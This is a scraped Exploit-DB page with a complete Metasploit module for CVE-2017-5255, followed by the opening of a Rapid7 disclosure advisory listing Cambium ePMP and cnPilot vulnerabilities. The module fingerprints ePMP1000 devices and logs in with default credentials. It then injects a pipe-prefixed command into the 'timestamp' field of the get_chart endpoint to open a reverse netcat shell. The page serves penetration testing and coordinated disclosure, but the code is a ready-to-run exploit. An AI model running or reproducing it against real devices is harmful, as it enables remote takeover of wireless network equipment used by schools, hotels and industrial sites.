=== Content from www.exploit-db.com_df82dffc_20250124_141222.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Cambium ePMP1000 - 'get\_chart' Shell via Command Injection (Metasploit)

#### EDB-ID:

###### 43413

#### CVE:

###### [2017-5255](https://nvd.nist.gov/vuln/detail/CVE-2017-5255)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [CGI](/?platform=cgi)

#### Date:

###### 2018-01-01

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => "Cambium ePMP1000 'get_chart' Shell via Command Injection (v3.1-3.5-RC7)",
      'Description' => %{
          This module exploits an OS Command Injection vulnerability in Cambium
          ePMP1000 device management portal. It requires any one of the following login
          credentials - admin/admin, installer/installer, home/home - to set up a reverse
          netcat shell. The module has been tested on versions 3.1-3.5-RC7.
      },
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'References' =>
        [
          ['CVE', '2017-5255'],
          ['URL', 'https://blog.rapid7.com/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities']
        ],
      'Privileged' => true,
      'Targets' =>
        [
          ['CMD',
            {
              'Arch' => ARCH_CMD,
              'Platform' => 'unix'
            }
          ]
        ],
      'DisclosureDate' => 'Dec 18 2017',
      'DefaultTarget'  => 0,
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_netcat' })
    )

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),
        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])
      ], self.class
    )

    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
  end

  #
  # Fingerprinting
  #
  def is_app_epmp1000?
    begin
      res = send_request_cgi(
        {
          'uri'       => '/',
          'method'    => 'GET'
        }
      )
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    end

    good_response = (
      res &&
      res.code == 200 &&
      (res.body.include?('cambium.min.css') || res.body.include?('cambiumnetworks.com') && res.body.include?('https://support.cambiumnetworks.com/files/epmp/'))
    )

    if good_response
      get_epmp_ver = res.body.match(/"sw_version">([^<]*)/)
      if !get_epmp_ver.nil?
        epmp_ver = get_epmp_ver[1]
        if !epmp_ver.nil?
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...")
          return true, epmp_ver
        else
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000...")
          epmp_ver = ''
          return true, epmp_ver
        end
      end
    else
      print_error("#{rhost}:#{rport} - Application does not appear to be Cambium ePMP 1000. The target is not vulnerable.")
      epmp_ver = nil
      return false
    end
  end

  #
  # check
  #
  def check
    success, epmp_ver = is_app_epmp1000?
    if (success != 'false' && !epmp_ver.nil? && epmp_ver >= '3.1')
      return CheckCode::Vulnerable
    else
      return CheckCode::Safe # Using 'Safe' here to imply this ver is not exploitable using the module'
    end
  end

  #
  # Login
  #
  def login(user, pass)
    res = send_request_cgi(
      {
        'uri' => '/cgi-bin/luci',
        'method' => 'POST',
        'headers' => {
          'X-Requested-With' => 'XMLHttpRequest',
          'Accept' => 'application/json, text/javascript, */*; q=0.01'
        },
        'vars_post' =>
          {
            'username' => 'dashboard',
            'password' => ''
          }
      }
    )

    cookies = res.get_cookies_parsed
    check_sysauth = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s

    good_response = (
      res &&
      res.code == 200 &&
      check_sysauth.include?('sysauth')
    )

    if good_response
      sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
      sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)
      prevsessid = res.body.match(/((?:[a-z][a-z]*[0-9]+[a-z0-9]*))/)

      res = send_request_cgi(
        {
          'uri' => '/cgi-bin/luci',
          'method' => 'POST',
          'cookie' => sysauth_value,
          'headers' => {
            'X-Requested-With' => 'XMLHttpRequest',
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Connection' => 'close'
          },
          'vars_post' =>
            {
              'username' => user,
              'password' => pass,
              'prevsess' => prevsessid
            }
        }
      )

      good_response = (
        res &&
        res.code == 200 &&
        !res.body.include?('auth_failed')
      )

      if good_response
        print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")

        # check if max_user_number_reached?
        if !res.body.include?('max_user_number_reached')
          # get the cookie now
          cookies = res.get_cookies_parsed
          stok_value_dirty = res.body.match(/"stok": "(.*?)"/)
          stok_value = "#{stok_value_dirty}".split('"')[3]
          sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
          sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)

          final_cookie = "#{sysauth_value}" + 'usernameType_80=admin; stok_80=' + "#{stok_value}"

          # create config_uri
          config_uri_get_chart = '/cgi-bin/luci/;stok=' + "#{stok_value}" + '/admin/get_chart'
          return final_cookie, config_uri_get_chart
        else
          print_error('The credentials are correct but maximum number of logged-in users reached. Try again later.')
          final_cookie = 'skip'
          config_uri_dump_config = 'skip'
          config_uri_reset_pass = 'skip'
          config_uri_get_chart = 'skip'
          return final_cookie, config_uri_get_chart
        end
      else
        print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
        final_cookie = 'skip'
        config_uri_get_chart = 'skip'
        return final_cookie, config_uri_get_chart
      end
    end
  end

  #
  # open cmd_shell
  #
  def cmd_shell(config_uri, cookie)
    command = payload.encoded
    inject = '|' + "#{command}"
    clean_inject = CGI.unescapeHTML(inject.to_s)

    print_status('Sending payload...')

    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => config_uri,
        'cookie' => cookie,
        'headers' => {
          'Accept' => '*/*',
          'Accept-Language' => 'en-US,en;q=0.5',
          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With' => 'XMLHttpRequest',
          'Connection' => 'close'
        },
        'vars_post' =>
          {
            'measure' => 's', # This parameter can also be used for injection
            'timestamp' => clean_inject,
            'debug' => 0
          }
      }, 25
    )
    handler
  end

  # exploit

  def exploit
    _success, epmp_ver = is_app_epmp1000?
    if (epmp_ver < '3.1' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')
      print_error('This module is applicable to versions 3.1-3.5-RC7 only. Exiting now.')
      return
    else
      cookie, config_uri_get_chart = login(datastore['USERNAME'], datastore['PASSWORD'])
      if cookie == 'skip' && config_uri_get_chart == 'skip'
        return
      else
        cmd_shell(config_uri_get_chart, cookie)
      end
    end
  end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
[Link](https://raw.githubusercontent.com/rapid7/metasploit-framework/e6de25d63b2eacc2876b3d0e8a19fc0400734550/modules/exploits/unix/http/epmp1000_get_chart_cmd_shell.rb)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from blog.rapid7.com_380a722f_20250124_141221.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Blog](/blog/ "Blog")

* Select
  + [Vulnerability Management](/blog/tag/vulnerability-management/)
  + [MDR](/blog/tag/mdr-managed-detection-response/)
  + [Detection & Response](/blog/tag/detection-and-response/)
  + [Cloud Security](/blog/tag/cloud-security/)
  + [App Security](/blog/tag/application-security/)
  + [Metasploit](/blog/tag/metasploit/)
  + [All Topics](/blog/tags/)

[Start Trial](/trial/insight/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

* [Blog](/blog/ "Blog")
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [MDR](/blog/tag/mdr-managed-detection-response/)
* [Detection & Response](/blog/tag/detection-and-response/)
* [Cloud Security](/blog/tag/cloud-security/)
* [App Security](/blog/tag/application-security/)
* [Metasploit](/blog/tag/metasploit/)
* [All Topics](/blog/tags/)
[Start Trial](/trial/insight/)

# R7-2017-25: Cambium ePMP and cnPilot Multiple Vulnerabilities

* Dec 19, 2017
* 18 min read
* [Tod Beardsley](/blog/author/tod-beardsley/)

*Last updated at Tue, 03 Sep 2024 18:29:07 GMT*

## Summary of Issues

Multiple vulnerabilities in Cambium Networks’ ePMP and cnPilot product lines were discovered by independent researcher [Karn Ganeshen](https://ipositivesecurity.com/), which have, in turn, been addressed by the vendor. The affected devices are in use all over the world to provide wireless network connectivity in a variety of contexts, including schools, hotels, municipalities, and industrial sites, [according to the vendor](https://www.cambiumnetworks.com/industry/).

These issues were reported by [Karn Ganeshen](https://ipositivesecurity.com/) to Rapid7 for [coordinated disclosure](https://www.rapid7.com/security/disclosure/) with the vendor and the public, and they range from shipping suspiciously old binaries and function calls up to a hidden backdoor service. We have no indication that there are any active or recent compromises on any customer network leveraging these vulnerabilities. Users of these products are urged to check [Cambium Networks’ support portal](https://support.cambiumnetworks.com/login) for critical updates to their devices. Rapid7 would like to recognize Cambium for their quick turnaround time in addressing the most critical issues disclosed. Their commitment to security is appreciated.

The table below briefly delineates the vulnerabilities found. Note that for the non-SSL vulnerabilities, all of these issues are exposed only to *authenticated users*: in order to exploit them, and attacker would at least need to know (or guess) a legitimate username and password. In the case of the SNMP-vectored issues, the attacker would need to first learn or guess the appropriate community string. For the SSL and JQuery issues, the attacker would need to first gain man-in-the-middle (MitM) position on the local network.

| R7 ID | CVE | Product | Vulnerability | CVSS | Status |
| --- | --- | --- | --- | --- | --- |
| R7-2017-25.1 | CVE-2017-5254 | ePMP v3.5 | Privilege escalation via client-side protection bypass | [9.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) | Fixed in v3.5.1 |
| R7-2017-25.2 | CVE-2017-5255 | ePMP v3.5 | Privilege escalation via command injection | [9.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) | Fixed in v3.5.1 |
| R7-2017-25.3 | CVE-2017-5256 | ePMP v3.5 | Privilege escalation via XSS | [8.3](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L) | Fixed in v3.5.1 |
| R7-2017-25.4 | CVE-2017-5257 | ePMP v3.5 | Privilege escalation via XSS via SNMP OIDs using RW access | [7.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:N) | Fixed in v3.5.1 |
| R7-2017-25.5 | CVE-2017-5258 | ePMP v3.5 | Privilege escalation XSS via SNMP configuration upload using RW access | [7.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:N) | Fixed in v3.5.1 |
| R7-2017-25.6 | CVE-2017-5259 | cnPilot v4.3.2-R4 | Privilege escalation via backdoor access | [9.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) | Fixed in v4.4 |
| R7-2017-25.7 | CVE-2017-5260 | cnPilot v4.3.2-R4 | Privilege escalation via direct object reference | [9.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) | Fixed in v4.4 |
| R7-2017-25.8 | CVE-2017-5261 | cnPilot v4.3.2-R4 | Critical information disclosure via file path traversal in Readfile | [6.8](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) | Fixed in v4.4 |
| R7-2017-25.9 | CVE-2017-5262 | cnPilot v4.3.2-R4 | Privilege escalation via SNMP RO access to sensitive OIDs | [6.8](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) | Fixed in v4.4 |
| R7-2017-25.10 | CVE-2017-5263 | cnPilot v4.3.2-R4 | Lack of CSRF controls | [2.9](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N) | Unpatched |
| R7-2017.25.11 | None | cnPilot v4.3.2-R4, ePMP v3.5, and ePMP 1000 Hotspot v3.3 | Shipping suspicious binaries | n/a | Unresolved |

